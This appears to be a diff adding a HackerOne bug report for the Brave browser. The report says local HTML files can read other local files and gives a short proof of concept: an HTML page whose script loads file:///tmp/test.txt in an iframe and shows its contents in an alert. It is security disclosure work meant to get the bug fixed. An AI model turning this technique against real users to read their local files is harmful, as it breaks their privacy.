@@ -1,0 +1,28 @@
+[HackerOne] local files should not have read-access to other local files
+
+
+for instance, this is disallowed in Chrome unless http://peter.sh/experiments/chromium-command-line-switches/#allow-file-access-from-files is set
+PoC:
+0. echo 'hello world' > /tmp/test.txt
+
+save the following to a local html file:
+
+<html>
+<body>
+<div id='div1'>
+</div>
+<script>
+current_href = document.location.href
+frame = document.createElement('iframe'); frame.src = 'file:///tmp/test.txt'; frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
+setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
+alert('Your data is: ' + loot)
+}, 500)
+</script>
+</body>
+</html>
+
+
+open the file in brave
+
+the alert should not happen
+cc @bridiver
